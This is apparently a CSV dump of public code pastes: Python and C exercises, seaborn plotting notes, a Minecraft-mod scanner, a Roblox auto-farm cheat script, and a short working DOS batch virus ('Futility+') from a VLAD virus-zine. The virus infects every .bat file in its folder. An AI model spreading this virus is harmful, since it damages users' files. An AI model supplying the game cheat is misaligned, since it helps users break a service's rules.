id,title,username,language,date,content
K7V1aivi,"05 While Loops, Task 8: Graduation",tvacheva,Python,Sunday 2nd of July 2023 12:19:22 PM CDT,"# Input
student = input()

# Logic
next_class_counter = 1
class_pass = 0
total_grade = 0
average_grade = 0
failed = 0

while True:
    grade = float(input())

    if grade < 4:
        failed += 1

        if failed == 2:
            # suspended = True
            print(f'{student} has been excluded at {class_pass} grade')
            break

        continue

    class_pass += 1
    next_class_counter = class_pass + 1
    total_grade += grade
    average_grade = total_grade / class_pass

    if class_pass == 12:
        print(f'{student} graduated. Average grade: {average_grade:.2f}')
        break
"
d2gtTwWh,"LinkList ( Insert, evenElementDelete, FindMiddle )",Tazbid,C,Sunday 2nd of July 2023 12:18:18 PM CDT,"#include<stdio.h>
#include<stdlib.h>

int lengthLinkList=0;

// linkList
typedef struct linklist
{
    int data;
    struct linklist *next;
} node;

// function for insert a new node in the LinkList at last position
void insertNode(node *linkList, int data)
{
    while (linkList->next != NULL)
    {
        linkList = linkList->next;
    }
    linkList->next = (node*)malloc(sizeof(node));
    linkList->next->data = data;
    linkList->next->next = NULL;
    lengthLinkList++;
}

// function for delete even number of element from the LinkList
void deleteEvenElements(node *linkList){
    while (linkList->next != NULL)
    {
        if((linkList->next->data)%2==0) // check that the data is even or not
        {
            linkList->next = linkList->next->next;
            lengthLinkList--;
        }
        else{
            linkList = linkList->next;
        }
    }
}

void printMiddleNode(node *linkList){

    printf(""\n\nLength: %d\n"",lengthLinkList);
    if(lengthLinkList==0){ // if length is 0, so no middle element
        printf(""\nThere is no element in the LinkList.\n"");
        return;
    }
    int middle = lengthLinkList/2; //then fine the middle position
    if(lengthLinkList%2==0){
        printf(""There are even numbers of elements in the LinkList."");
        printf("" So, there will two middle nodes.\n"");
        while(middle--){
            linkList = linkList->next;
        }
        // if length is even, then middle will be (n/2),(n/2)+1;
        printf(""\nMiddle Elements: %d, %d\n"", linkList->data, linkList->next->data);
    }
    else{
        printf(""There are odd numbers of elements in the LinkList."");
        printf("" So, there will only one middle nodes.\n"");
        while(middle--){
            linkList = linkList->next;
        }
        // if length is odd, then middle will be (n/2)+1;
        printf(""\nMiddle Element: %d\n"", linkList->next->data);
    }
}

// function for print the current existing LinkList
void printLinkList(node *linkList)
{
    while (linkList->next != NULL)
    {
        printf(""%d "", linkList->next->data);
        linkList = linkList->next;
    }
}

int main()
{
    node *head = (node*)malloc(sizeof(node));
    head->next = NULL;

    int n, data;
    printf(""How many node do you want to insert?\n"");
    scanf(""%d"",&n);

    printf(""Insert data for %d elements: "", n);
    for(int i=0; i<n; i++){
        scanf(""%d"", &data);
        insertNode(head,data);
    }

    printf(""\nThe current LinkList - "");
    printLinkList(head);

    deleteEvenElements(head);

    printf(""\n\nAfter Delete the even numbers from the LinkList - "");
    printLinkList(head);

    printMiddleNode(head);

    return 0;
}
"
kYE5VSyt,Anime Lost Simulator 1st Release,Dizzark,Lua,Sunday 2nd of July 2023 12:05:18 PM CDT,"--created by Dizzark; a random discord user
--Defense wasn't completed (got bored)

getgenv().GameLoop = true
getgenv().RaidBoss = true
getgenv().GemBoss = true
getgenv().LBR = true
getgenv().AutoEgg = false
getgenv().AutoKill = true
getgenv().Invasion = false
getgenv().Defense = false

local _USER = ""Dizzark0"" --Put your in-game name here
local _MAPS = { ""Sarnek"", ""Ninja Town"", ""Demon Hill"",
                ""Pirate Sea"", ""Hunter World"", ""Tokyo City"",
                ""Dragon Land"", ""Monarchs World"", ""Japan Monsters"",
                ""Mage Land"", ""Hollow Universe"", ""Bizarre World"" }
local _SMAPS = { ""Invasion"", ""Gems Boss"", ""Judgement"", ""Lost Boss Raid"", ""Defense"" }
local _MAPAMOUNT = #_MAPS
local _SMAPAMOUNT = #_SMAPS
local _ACTIONS = {  ""TELEPORT"", ""TELEPORT_FAIL"", ""MAP_INDEX"",
                    ""MAP_INDEX_FAIL"" }
local InvasionInfo = game:GetService(""ReplicatedStorage"").InvasionInfo
local DefenseInfo = game:GetService(""ReplicatedStorage"").DefenseInfo
local waveMax = 50
local defWaveMax = 10
local killCounter = 0

local function getMap()
    return game:GetService(""Players"")[_USER].PlayerInfo.CurrentWorld.Value
end
local function getUserHumanoidRootPart()
    return game:GetService(""Workspace"").PLRCharacters[_USER].HumanoidRootPart
end
local function updateUserCFrame(cF)
    getUserHumanoidRootPart().CFrame = cF
end
local function _isMapValid(mapName)
    for index, map in pairs(_MAPS) do
        if mapName == map then return true end
    end
    for index, map in pairs(_SMAPS) do
        if mapName == map then return true end
    end
    return false
end
local function _isActionValid(actionName)
    for index, action in pairs(_ACTIONS) do
        if actionName == action then return true end
    end
    return false
end
local function displayAction(action, ...) --This function is FAR from done; need to incorparate all functions below
    if _isActionValid(action) then
        local args = {...}
        if action == ""TELEPORT"" then
            if not(#args == 2) then print(""Invalid amount of arguments for TELEPORT action ~displayAction"")
            else
                print(action .. "": "" .. args[1] .. "" -> "" .. args[2])
            end
        elseif action == ""TELEPORT_FAIL"" then
            if not(#args == 1) then
                print(""Invalid amount of arguments for TELEPORT_FAIL action ~displayAction"")
            else
                print(action .. "": You're already on "" .. args[1])
            end
        elseif action == ""MAP_INDEX"" then
            if not(#args == 3) then print(""Invalid amount of arguments for MAP_INDEX action ~displayAction"")
            else
                print(action .. "": "" .. args[1] .. "" was found in index "" .. args[2] .. "" in the "" .. args[3] .. "" list ~displayAction"")
            end
        elseif action == ""MAP_INDEX_FAIL"" then
            if not(#args == 1) then print(""Invalid amount of arguments for MAP_INDEX_FAIL action ~displayAction"")
            else
                print(action .. "": "" .. args[1] .. "" was not found in any list ~displayAction"")
            end
        else
            print(action .. "" is valid but has no functionality ... add it ~displayAction"")
        end
    else print(""Action name provided isn't valid ~displayAction"") end
end
local function getMapIndex(mapName)
    for index, map in pairs(_MAPS) do
        if mapName == map then displayAction(""MAP_INDEX"", mapName, index, ""_MAPS"") return index end
    end
    for index, map in pairs(_SMAPS) do
        if mapName == map then displayAction(""MAP_INDEX"", mapName, index, ""_SMAPS"") return index end
    end
   
    displayAction(""MAP_INDEX_FAIL"", mapName)
    return 0
end
local function teleportTo(mapName)
    if _isMapValid(mapName) then
        if getMap() == mapName then
            displayAction(""TELEPORT_FAIL"", mapName)
        else
            displayAction(""TELEPORT"", getMap(), mapName)
            game:GetService(""ReplicatedStorage"").Remotes.gamepassTeleport:FireServer(mapName)
           
            local counter = 0
            while getMap() ~= mapName do
                if counter % 50 == 0 then print(""Still not in "" .. mapName .. "". Waiting ..."") end
                if counter == 200 then
                    game:GetService(""ReplicatedStorage"").Remotes.gamepassTeleport:FireServer(mapName)
                    counter = 0
                end
                counter = counter + 1
               
                wait()
           
            end
        end
    else print(""Map name that is provided isn't valid ~teleportTo"") end
end

local function getGemsBossStatus()
    --return game:GetService(""ReplicatedStorage"")[""Server Values""].GemsBoss.Value
    if #(game:GetService(""ReplicatedStorage"")[""Unloaded_NPCs""][""Gems Boss""].LBR:GetChildren()) > 0 then
        if #(game:GetService(""ReplicatedStorage"")[""Unloaded_NPCs""][""Gems Boss""].LBR[""Alonezinho Noob""][""Hit Tags""]:GetChildren()) == 0 then
            return true
        end
        print(""Gems Boss is alive but you did it already; waiting for despawn"")
    end
    return false
end
local function getGems()
    return game:GetService(""Players"").Dizzark0.PlayerInfo.Currencies.Gems.Value
end
local function getGemsBossTime()
    return game:GetService(""ReplicatedStorage"")[""Server Values""].GemsBossTime.Value
end
local function fightGemBoss()
    local gems = getGems() print(""Gems = "" .. gems)
    if getMap() ~= ""Gems Boss"" then teleportTo(""Gems Boss"") end wait(5)
   
    updateUserCFrame(game:GetService(""Workspace"").EnemyNPCs[""Gems Boss""].LBR[""Alonezinho Noob""].HumanoidRootPart.CFrame)
   
    while gems == getGems() and getGemsBossTime() > 120 do
        print(""Gem Boss in progress..."")
        wait(0.5)
    end
   
    print(""Old Gems = "" .. gems .. "" New Gems = "" .. getGems())
    wait(1)
end

local function getLBRTime()
    return game:GetService(""ReplicatedStorage"")[""Server Values""].LostBossTime.Value
end
local function getLBRStatus()
    if #(game:GetService(""ReplicatedStorage"")[""Unloaded_NPCs""][""Lost Boss Raid""].LBR:GetChildren()) > 0 then print(""LBR has Children"")
        if #(game:GetService(""ReplicatedStorage"")[""Unloaded_NPCs""][""Lost Boss Raid""].LBR[""Gold Fruit""][""Hit Tags""]:GetChildren()) == 0 then print(""LBR is fresh; go get em"")
            return true
        end
        print(""LBR is alive but you did it already; waiting for despawn"")
    end
    return false
end
local function fightLBR()
    if getMap() ~= ""Lost Boss Raid"" then teleportTo(""Lost Boss Raid"") end wait(5)
    updateUserCFrame(game:GetService(""Workspace"").EnemyNPCs[""Lost Boss Raid""].LBR[""Gold Fruit""].HumanoidRootPart.CFrame)
    while getMap() == ""Lost Boss Raid"" and getLBRTime() > 120 do
        print(""LBR in progress..."")
        wait(3)
    end
    wait(5)
end

local function isRaidBossInLoadedList()
    if game:GetService(""Workspace"").EnemyNPCs[getMap()]:FindFirstChild(""RaidBoss"") then print(""debug - findFirstChild RaidBoss true ~isRaidBossInLoadedList"")
        return true end
    print(""debug - findFirstChild RaidBoss false ~isRaidBossInLoadedList"")
    return false
end
local function isRaidBossSpawned(raidBoss)
    return #raidBoss:GetChildren() > 0
end
local function getRaidBossLoaded()
    local mob = game:GetService(""Workspace"").EnemyNPCs[getMap()]:FindFirstChild(""RaidBoss"")
    if mob then return mob else return {} end
end
local function getRaidBossUnloaded()
    local raidList = {}
    local raidMap = {}
    local unloadedNPCsPath = game:GetService(""ReplicatedStorage"")[""Unloaded_NPCs""]
    for _, map in pairs(unloadedNPCsPath:GetChildren()) do
        for __, group in pairs(map:GetChildren()) do
            if group.name == ""RaidBoss"" then
                if #group:GetChildren() > 0 then
                    for ___, raidBoss in pairs(group:GetChildren()) do
                        table.insert(raidList, raidBoss) print(""raidList = "" .. #raidList)
                        table.insert(raidMap, map.name)
                    end
                    break
                end
            end
        end
    end
    return raidList, raidMap
end
local function fightRaidBoss()
    local raidList, mapList = getRaidBossUnloaded()
   
    --if isRaidBossInLoadedList() then print(""debug - isRaidBossInLoadedList() is true ~ fightRaidBoss()"")
    --    if isRaidBossSpawned(getRaidBossLoaded()) then print(""debug - isRaidBossSpawned(getRaidBossLoaded()) is true ~ fightRaidBoss()"")
 --           for _, raidBoss in pairs(getRaidBossLoaded():GetChildren()) do --Should only run once
  --              print(""debug - "" .. raidBoss.name .. "" is added to raidlist  ~ fightRaidBoss()"")
 --               table.insert(raidList, raidBoss)
--                table.insert(mapList, getMap())
  --          end
  --      else
 --           print(""Raid boss is not loaded in current loaded map"")
   --     end
  --  else
 --       print(""debug - isRaidBossInLoadedList() is false ~ fightRaidBoss()"")
  --  end
    if #raidList == 0 then
        print(""No raid boss available ... yet"")
        return "":)""
    end
    print(""debug - got to main part of fightRaidBoss() ~ fightRaidBoss()"")
    for i, raid in pairs(raidList) do
        for j, map in pairs(mapList) do
            if i == j then
                wait(1)
                teleportTo(map)
                print(""Teleported to "" .. map)
                updateUserCFrame(raid.HumanoidRootPart.CFrame)
                local counter = 0
                while isRaidBossSpawned(raid) do
                    print(""Raid Boss still alive... wait 3 seconds"")
                    wait(3)
                    counter = counter + 1
                   
                    if (counter == 2) then
                        updateUserCFrame(raid.HumanoidRootPart.CFrame)
                        print(""Got stuck, tele gaain to "" .. raid.name)
                        counter = 0
                    end
                end
                print(""Raid Boss died"")
                break
            end
        end
    end
    wait(5)
end

local function GoToLastMap()
    local lastMap = _MAPS[#_MAPS]
    if getMap() ~= lastMap then
        teleportTo(lastMap)
        while getMap() ~= lastMap do
            print(""Map still loading... 3 sec wait"") wait(3)
        end
    end
end
local function perfectPositionForEggs() --NOTE: In Mage Land ONLY! Update this function every new map
    return CFrame.new(-1176.70618, 44.3777313, -1519.18689)
end
local function spin()
    game:GetService(""ReplicatedStorage"").Modules.LBConnection.Remotes.Egg_Spin.Sent:FireServer(math.random(65535), ""Open_Multi"")
    print(""spin()"")
end

-- NON Invasion
local function getMobs()
    wait(1)
    local mobsPath = game:GetService(""Workspace"").EnemyNPCs[getMap()]
    local mobList = {}
   
    if mobsPath then
        for index, group in pairs(mobsPath:GetChildren()) do
            if #group:GetChildren() > 0 then --As it stands, ""Weak, Strong, etc."" will have 1 children if loaded""
                table.insert(mobList, group)
            end
        end
       
        print(""Returning "" .. #mobList .. "" mobs"")
        return mobList
    else
        print(""For some reason, mobsPath is nil. Returning empty mobList"")
        return mobList
    end
end
local function getMobHumanoidRootPart(mob)
    --
    print(""debug purposes"")
    local caller = debug.getinfo(2, ""n"").name
    print(""The caller of getMobHumanoidRootPart() is "" .. caller)
    print(mob)
    --
    for index, part in pairs(mob:GetDescendants()) do
        if part.name == ""HumanoidRootPart"" then print(""Found the HRP"")
            return part
        end
    end
    print(""Didn't find HumanoidRootPart ~getMobHumanoidRootPart"")
end
local function getMobCFrame(HRP)
    return HRP.CFrame
end
local function getMobName(HRP)
    return HRP.Parent.name
end
local function specificMobGroup(mobList, mobGroup) --mobGroup could be weak, strong, boss, ultra boss, etc.
    local updatedList = {}
   
    for index, group in pairs(mobList) do
        if group.name == mobGroup then
            table.insert(updatedList, group)
        end
    end
   
    print(""Updated mobList with only "" .. mobGroup .. "". Returns list with "" .. #updatedList .. "" mobs."")
    return updatedList
end
local function teleportToMob(cf)
    updateUserCFrame(cf)
end
local function displayHealth(mob)
    for i,v in pairs(mob:GetDescendants()) do
        if v.name == ""CurrentHealth"" then
            return v.Value
        end
    end
    warn(""Couldn't find CurrentHealth in displayHealth. Returning 0."")
    return 0
end
local function checkHP_GTZ(mob)
    local success, result = pcall(displayHealth, mob)

    if success then
        if not(result > 0) then
            killCounter = killCounter + 1
            return false
        else return true end
        --return result > 0
    else print(""Error in displayHealth - "", result) return false end
end
local function killMobList(list)
    print(""Mobs in current list: "" .. #list)
    for i, v in pairs(list) do
        local HRP, name
        if #v:GetChildren() > 0 then
           
            local success, _HRP = pcall(getMobHumanoidRootPart, v)
            if not success then
                warn(""Error in getMobHumanoidRootPart - "", _HRP)
                break
            else 
                local success, _name = pcall(getMobName, _HRP)
                if not success then
                    warn(""Error in getMobName - "", _name)
                    break
                else
                    HRP = _HRP
                    name = _name
                end
            end
            
            if getUserHumanoidRootPart().Position ~= HRP.Position then print(""Teleported to "" .. name)
                teleportToMob(getMobCFrame(HRP))
                wait()
            end
           
            local counter = 0
            while #v:GetChildren() > 0 and checkHP_GTZ(v) and AutoKill do
                counter = counter + 1
               
                if counter == 100 then
                    teleportToMob(getMobCFrame(HRP))
                    print(""Got stuck, teleporting to enemy again"")
                    counter = 0
                end
                wait()
               
            end
           
            print(#list - i .. "" mobs left"")
            print(""Total Kills:"", killCounter)
        else
            print(v.name .. "" index "" .. i .. "" in list wasn't valid... it should have. Double check ..."")
        end
    end
end

-- Invasion
local function isInvasionAvailable()
    if InvasionInfo.isActive.Value == true and InvasionInfo.hasStarted.Value == false then
        return true end
    return false
end
local function alreadyInInvasion()
    if getMap() == ""Invasion"" then return true end return false
end
local function teleportToInvasion()
    if getMap() ~= ""Invasion"" then
    game:GetService(""ReplicatedStorage"").Modules.LBConnection.Remotes.ToInvasion:FireServer() end
end
local function getWave()
    return game:GetService(""ReplicatedStorage"").InvasionInfo[""Current Wave""].Value
end
local function getMobsInvasion() wait(.5)
    local mobsPath = game:GetService(""Workspace"").EnemyNPCs.Invasion.Invasion
    local mobList = {}
   
    if mobsPath then
        for index, mob in pairs(mobsPath:GetChildren()) do
            if #mob:GetChildren() > 0 then
                table.insert(mobList, mob)
            end
        end
       
        print(""Returning "" .. #mobList .. "" mobs"")
        return mobList
    else
        print(""For some reason, mobsPath is nil. Returning empty mobList"")
        return mobList
    end
end
local function killMobListInvasion(list) wait(.5)
    print(""Mobs in current list: "" .. #list)
    for i, v in pairs(list) do
        if v and #v:GetChildren() > 0 then
            print(""debug - "" .. v.name)
           
            local HRP = getMobHumanoidRootPart(v) print(""debug - got mob HRP - "" .. HRP.name)
            local name = getMobName(HRP) print(""debug - got mob name - "" .. name)
           
            print(v, name, getMobCFrame(HRP))
            teleportToMob(getMobCFrame(HRP))
            while #v:GetChildren() > 0 and Invasion do
                wait ()
            end
           
            print(#list - i .. "" mobs left"")
        else
            print(v .. "" index "" .. i .. "" in list wasn't valid... it should have. Double check ..."")
        end
    end
end
local function getInvasionGroup()
    print(""Got Invasion Group"")
    return game:GetService(""Workspace"").EnemyNPCs.Invasion.Invasion
end
local function compareHealth(mob1, mob2)
    return mob1.Info.CurrentHealth.Value < mob2.Info.CurrentHealth.Value
end

local function defBuyNormal()
    game:GetService(""ReplicatedStorage"").Modules.LBConnection.Remotes.InitDefense:FireServer(""Normal"")

    while DefenseInfo.isActive == false do wait() end
end
local function teleportToDefense()
    game:GetService(""ReplicatedStorage"").Modules.LBConnection.Remotes.ToDefense:FireServer()

    while getMap() ~= ""Defense"" do wait() end
end
local function teleportToDefensePos()
    updateUserCFrame(CFrame.new(570.7184448242188, 7.388614654541016, -2383.95947265625))
end
local function defenseKill()
    
end

while GameLoop do wait()
    if GemBoss then print(""In GemBoss"")
        local successStatus, result = pcall(getGemsBossStatus)
        if successStatus and result then
            local successFight, result = pcall(fightGemBoss)
           
            if not success then warn(""Error: "", result)
            else print(""Fight ended, tele'd back. Checking if boss is available again soon..."") end
        else
            warn(""successStatus returned false or the result was False! In getGemsBossStatus: "", result)
        end
        print(""Exiting GemBoss"")
    end
    if RaidBoss then print(""In RaidBoss"")
        local success, result = pcall(fightRaidBoss)
       
        if not success then warn(""Error: "", result)
        else print(""Exiting RaidBoss"") end
       
       
        wait(.5)
    end
	if LBR then print(""In LBR"")
        if getLBRStatus() then print(""Pre LBR Fight"")
            local success, result = pcall(fightLBR)
            
            if not success then warn(""Error: "", result)
            else print(""Fight ended, tele'd back from LBR."") end
        else
            print(""No LBR at the moment ..."")
        end
        wait()
        print(""Exiting LBR"")
    end
    if AutoKill then wait()
        teleportTo(_MAPS[_MAPAMOUNT])
        local success, mobList = pcall(getMobs)
        if success then
            local success, result = pcall(killMobList, mobList)
            if success then
                print(""AutoKill was successful"")
            else
                warn(""killMobList wasn't successful: Error - "", result)
            end
        else
            warn(""getMobs wasn't successful: Error - "", mobList)
        end
    end
    if AutoEgg then print(""In AutoEgg"")
        GoToLastMap()
        if getUserHumanoidRootPart().Position ~= perfectPositionForEggs().Position then
            updateUserCFrame(perfectPositionForEggs())
            wait(1)
        end
        spin()
        wait()
        print(""Exiting AutoEgg"")
    end
    if Invasion then print(""In Invasion"")
        if isInvasionAvailable() or alreadyInInvasion() then
            if getMap() ~= ""Invasion"" then teleportToInvasion() end--tele to invasion
           
            while Invasion and getMap() ~= ""Invasion"" do print(""Waiting for Invasion to load"") wait(1) end
            while Invasion and getMap() == ""Invasion"" and InvasionInfo.hasStarted.Value == false do
                print(""You're in the Invasion; waiting for it to start"") wait(1)
            end
            while Invasion and getWave() <= waveMax and InvasionInfo.hasStarted.Value == true do
                print(""You're in the invasion; starting to kill"")
                local group = getInvasionGroup() print(""group = getInvasionGroup"")
                local amount = #group:GetChildren() print(""amount = #group:GetChildren()"")
                while amount == 0 do print(""Waiting... amount = 0"") wait(1) amount = #group:GetChildren() end
               
                local gChildren = nil
                gChildren = group:GetChildren() print(""gChildren = group:GetChildren()"")
               
                for index, mob in pairs(gChildren) do
                    wait(.2)
                    if #mob:GetChildren() == 0 then
                        warn(""Mob was invalid"")
                        table.remove(gChildren, index)
                    end
                end
               
                local success, message = pcall(function() table.sort(gChildren, compareHealth) end)

                if not success then warn(""Error sorting children:"", message) gChildren = nil
                else print(""table.sort(gChildren, compareHealth)"") end

                local gChildrenToRemove = {}

                if gChildren then
                    for i,v in pairs(gChildren) do
                        if v == nil or #v:GetChildren() == 0 then
                            warn(""Found invalid mob after sorted"")
                            table.insert(gChildrenToRemove, i)
                            --gChildren = nil
                        end
                    end
                end

                for i = #gChildrenToRemove, 1, -1 do
                    table.remove(gChildren, gChildrenToRemove[i])
                end
                
                gChildrenToRemove = {}

                if gChildren then
                    for _, mob in pairs(gChildren) do
                        local success, hp = pcall(displayHealth, mob)
                        if success then
                            print(string.format(""%-20s - HP: %s"", mob.name, hp))
                        else 
                            table.insert(gChildrenToRemove, _)
                            print(""Failed DisplayHealth!"") --gChildren = nil
                            break
                        end
                    end
                end
               
                for i = #gChildrenToRemove, 1, -1 do
                    table.remove(gChildren, gChildrenToRemove[i])
                end

                print(""Starting main Invasion loop"")
                
               
                if gChildren then
                    for _, mob in pairs(gChildren) do
                        if #mob:GetChildren() == 0 then warn(""gChildren wasn't nil but mob was unloaded"")
                        else
                        
                            print(""AMOUNT DEBUG = "", #gChildren)
                            local name = mob.name print(""name: "" .. name)
                            local HRP = nil
                        
                            if #mob:GetChildren() > 0 then
                                local success, result = pcall(getMobHumanoidRootPart, mob)
                                if not success then
                                    warn(""Couldn't get HRP for "" .. name .. "" on line 496-ish"")
                                else
                                    HRP = result
                                end
                            end
                        
                            if HRP then teleportToMob(getMobCFrame(HRP)) print(""Teleported to: "" .. name) end
                        
                            local isStuck = 0
                        
                        
                            --if InvasionInfo.Players.Value > 0 and #group:GetChildren() == amount and mob.Info.CurrentHealth.Value > 0 then print(""Loop is valid"")
                            --else print(""Loop is not valid"") end
                            while HRP and InvasionInfo.Players.Value > 0 and checkHP_GTZ(mob) and Invasion do
                                --game:GetService(""Workspace"").EnemyNPCs.Invasion.Invasion[""Beast Monarch""].Info.CurrentHealth
                                if isStuck % 100 == 0 then print(mob.name .. "" is alive"") end
                                wait()
                                isStuck = isStuck + 1
                                if(isStuck == 500) then
                                    print(""You got stuck; tele again to "" .. name)
                                    teleportToMob(getMobCFrame(HRP))
                                    isStuck = 0
                                end
                            end
                            print(""Killed: "" .. name)
                            amount = amount - 1
                            wait()
                        end
                    end
                    --local mobList = getMobsInvasion()
                    --local mobAmount = #mobList
                   
                    --killMobListInvasion(mobList)
                   
                    wait()
                else warn(""gChildren was nil"") wait() end
            end
           
            if getMap() == ""Invasion"" then teleportTo(""Sarnek"") end -- tele from invasion
        end
        print(""Exiting Invasion"")
    end
    if Defense == true then wait() --not complete finish later
        if DefenseInfo.isActive.Value == true then
            if DefenseInfo.canEnter.Value == true then
                teleportToDefense()
                teleportToDefensePos()

                while DefenseInfo.hasStarted.Value == false do wait() end
                while DefenseInfo.Wave <= defWaveMax do defenseKill() end
            end
        else
            defBuyNormal()
        end
    end
end"
T1uPYe2D,BASIC CODE AND PROCESS TO DECIDE CHART,makispaiktis,Python,Sunday 2nd of July 2023 11:47:24 AM CDT,"# 0. Imports
import pandas as pd
pd.plotting.register_matplotlib_converters()
import matplotlib.pyplot as plt
# %matplotlib inline
import seaborn as sns




# **********************************************************************************************
# **********************************************************************************************
# 1. Show trends and changes over time (lineplot) - There is usually a column named ""Date""
# **********************************************************************************************
# **********************************************************************************************

# 1.1. Lineplot = Show for all the hotels (first plot) and then for only 1 (second plot)
museum_data = pd.read_csv(museum_filepath, index_col=""Date"", parse_dates=True)
sns.lineplot(data=museum_data)
sns.lineplot(data=museum_data['Avila Adobe'], label=""Avila Adobe"")




# **********************************************************************************************
# **********************************************************************************************
# 2. Show Distribution (histplot, kdeplot, jointplot)
# **********************************************************************************************
# **********************************************************************************************

# 2.1. Histplot = Histogram (with or without 'hue' argument)
cancer_data = pd.read_csv(cancer_filepath, index_col=""Id"")
sns.histplot(data=cancer_data, x=""Area (mean)"", hue=""Diagnosis"")

# 2.2. Kdeplot = Smoothed Histogram (with or without 'hue' argument)
cancer_data = pd.read_csv(cancer_filepath, index_col=""Id"")
sns.kdeplot(data=cancer_data, x=""Radius (worst)"", hue=""Diagnosis"")

# 2.3. Jointplot = 2D-KDE plot or 2D-HIST plot (with or without 'kind' argument)
cancer_data = pd.read_csv(cancer_filepath, index_col=""Id"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"", kind=""hist"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"", kind=""kde"")




# **********************************************************************************************
# **********************************************************************************************
# 3. Show comparison (barplot, heatmap)
# **********************************************************************************************
# **********************************************************************************************

# 3.1. Barplot = Bar diagram
ign_data = pd.read_csv(ign_filepath, index_col=""Platform"")
sns.barplot(x=ign_data.index, y=ign_data['Racing'])

# 3.2. Heatmap = Color-coded tiles (with 'annot=True', numbers in tiles are visible)
# ALL THE NUMBERS IN DATAFRAME MUST ARE THE SAME THING: EX: DELAY FOR AIRLINE COMPANY
# EX: ROW1 = 1 (Jan), ROW2 = 2 (Feb), ....
# EX: COL1 = A (AEGEAN), COL2 = B (RYANAIR), ....
# ALL THE NUMBERS ARE DELAYS
ign_data = pd.read_csv(ign_filepath, index_col=""Platform"")
sns.heatmap(data=ign_data, annot=True)




# **********************************************************************************************
# **********************************************************************************************
# 4. Show relation between 2 or 3 variables (scatterplot, regplot, swarmplot, lmplot)
# **********************************************************************************************
# **********************************************************************************************

# 4.1. Scatterplot - Relation between 2 variables: BOTH CONTINUOUS
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
sns.scatterplot(x=candy_data['sugarpercent'], y=candy_data['winpercent'])

# 4.2. Regplot - Relation and regression line between 2 variables: BOTH CONTINUOUS
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
sns.regplot(x=candy_data['sugarpercent'], y=candy_data['winpercent'])

# 4.3. Swarmplot - Relation between 2 variables: 1 CONTINUOUS + 1 CATEGORICAL
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
sns.swarmplot(x=candy_data[""chocolate""], y=candy_data[""winpercent""])

# 4.4. Scatterplot - Relation between 3 variables: 2 CONTINUOUS + 1 CATEGORICAL (in 'hue' argument)
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
sns.scatterplot(x=candy_data['pricepercent'], y=candy_data['winpercent'], hue=candy_data['chocolate'])

# 4.5. Lmplot - Relation and regression line between 3 variables: 2 CONTINUOUS + 1 CATEGORICAL (in 'hue' argument)
candy_data = pd.read_csv(candy_filepath, index_col=""id"")
sns.lmplot(data=candy_data, x=""pricepercent"", y=""winpercent"", hue=""chocolate"")"
Vr6s53mX,Kaggle - Exercise 7 - Create my own plots,makispaiktis,Python,Sunday 2nd of July 2023 11:03:21 AM CDT,"import pandas as pd
pd.plotting.register_matplotlib_converters()
import matplotlib.pyplot as plt
%matplotlib inline
import seaborn as sns
print(""Setup Complete"")

# 0. Read the data
my_filepath = ""/kaggle/input/fivethirtyeight-comic-characters-dataset/dc-wikia-data.csv""
my_data = pd.read_csv(my_filepath, index_col=""page_id"")
print(my_data.head())
print(my_data.shape)

# 1. KDE: Distribution of appearances
print(""Average appearances in original data ="", my_data[""APPEARANCES""].mean(), end='\n\n')
sns.kdeplot(data=my_data, x=""APPEARANCES"", fill=True)
plt.title(""Original Data: Heroes appearances density function"")
plt.show()

# 2. KDE while filtering: Keep the rows, where APPEARANCES <= 50 ---> A new dataframe is created
print(""Average appearances in filtered data ="", new_data[""APPEARANCES""].mean(), end='\n\n')
new_data = my_data[my_data[""APPEARANCES""] <= 50]
sns.kdeplot(data=new_data, x=""APPEARANCES"", fill=True)
plt.title(""Filtered data: Heroes appearances density function"")
plt.show()

# 3. Joint plot: 2D-KDE
sns.jointplot(data=my_data, x=""YEAR"", y=""APPEARANCES"", kind=""kde"")
# plt.title(""2D-KDE: Year vs Appearances"")
plt.show()
sns.jointplot(data=my_data, x=""YEAR"", y=""APPEARANCES"", kind=""hist"")
# plt.title(""2D-HIST: Year vs Appearances"")
plt.show()

# 4. Scatter plot to reveal the relation between year, appearances and ID
sns.scatterplot(x=my_data['YEAR'], y=my_data['APPEARANCES'])
plt.title(""Relation between: year and appearances"")
plt.show()
sns.scatterplot(x=my_data['YEAR'], y=my_data['APPEARANCES'], hue=my_data['ID'])
plt.title(""Relation between: year, appearances and ID"")
plt.show()

df1 = my_data[my_data['ID'] == 'Secret Identity']
df2 = my_data[my_data['ID'] == 'Public Identity']
df3 = my_data[my_data['ID'] == 'Identity Unknown']
SUM1 = df1.shape[0]
SUM2 = df2.shape[0]
SUM3 = df3.shape[0]
SUM = my_data.shape[0]
print(""Heroes with Secret Identity  = {}/{}"".format(SUM1, SUM))
print(""Heroes with Public Identity  = {}/{}"".format(SUM2, SUM))
print(""Heroes with Identity Unknown = {}/{}"".format(SUM3, SUM))
"
zEDrKUgn,scanner_geo_navi,miooo,Lua,Sunday 2nd of July 2023 10:46:24 AM CDT,"x = peripheral.wrap(""back"")
args = {...}
coords = args
repeat
    p = x.scan(16)
    i = 1
    allcoords = {}
    for b,v in pairs(p) do
        if string.find(v.name, coords[1]) ~= nil then
            allcoords[i] = {sum=math.abs(v.x)+math.abs(v.y)+math.abs(v.z),x=v.x, y=v.y, z=v.z}
            i=i+1
        end
    end
    table.sort(allcoords, function(a, b) return a.sum < b.sum end)
    term.clear()
    term.setCursorPos(1,1)
    print(allcoords[1].x, allcoords[1].y,allcoords[1].z)
    os.sleep(2)
until(table.getn(allcoords) == 0)
print(""end of program"")"
vt10yktc,VLAD Magazine - Issue AF - ARTICLE.3_6 - Futility+,FlyFar,Batch,Sunday 2nd of July 2023 10:07:24 AM CDT,"@ctty nul
echo if [%%1]==[INFECT.BAT] goto fuckit > infect.bat
echo del something.tmp >> infect.bat
echo copy /b %%1 something.tmp >> infect.bat
echo del %%1 >> infect.bat
echo copy /b %0 + %0.bat + something.tmp %%1 >> infect.bat
echo del something.tmp >> infect.bat
echo attrib +r %%1 >> infect.bat
echo :fuckit >> infect.bat
for %%f in (*.bat) do call infect.bat %%f
del infect.bat
ctty con
"
v6z5hLXz,String Pureness,DiYane,Python,Sunday 2nd of July 2023 10:06:45 AM CDT,"n = int(input())

